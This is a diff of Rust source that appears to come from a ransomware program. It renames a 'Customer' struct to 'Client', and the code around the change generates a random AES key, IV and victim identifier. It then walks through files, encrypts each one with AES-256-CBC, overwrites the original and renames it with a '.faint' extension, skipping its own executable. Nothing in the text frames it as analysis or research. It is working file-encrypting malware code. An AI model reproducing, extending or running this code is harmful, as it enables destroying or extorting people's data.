@@ -6,23 +6,25 @@ pub struct Keypair {
     pub key: String,
     pub iv: String,
 }
+
 #[derive(Debug)]
-pub struct Customer {
+pub struct Client {
     pub keypair: Keypair,
     pub identification: String,
 }
 
-pub fn get_id() -> Customer {
+pub fn get_id() -> Client {
     let keypair = Keypair {
         key: rand_string(32),
         iv: rand_string(16),
     };
-    let customer = Customer {
+
+    let client = Client {
         keypair,
         identification: rand_string(24),
     };
 
-    return customer;
+    return client;
 
     fn rand_string(length: u8) -> String {
         let rng = rand::thread_rng();
@@ -42,7 +44,7 @@ pub fn extensions(file: &path::Path) -> bool {
     }
 }
 
-pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
+pub fn encrypt(file: &path::PathBuf, client: &Client) {
     if !file.metadata().unwrap().permissions().readonly()
         && !extensions(file)
         && file.file_name() != env::current_exe().unwrap().file_name()
@@ -50,8 +52,8 @@ pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
         println!("{}", file.display());
         if let Ok(file_content) = fs::read(file) {
             let cipher =
-                libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
-            let encrypted = cipher.cbc_encrypt(customer.keypair.iv.as_bytes(), &file_content);
+                libaes::Cipher::new_256(client.keypair.key.as_bytes().try_into().unwrap());
+            let encrypted = cipher.cbc_encrypt(client.keypair.iv.as_bytes(), &file_content);
             if fs::write(file, encrypted).is_ok() {
                 fs::rename(file, format!("{}.faint", file.display())).unwrap();
             }
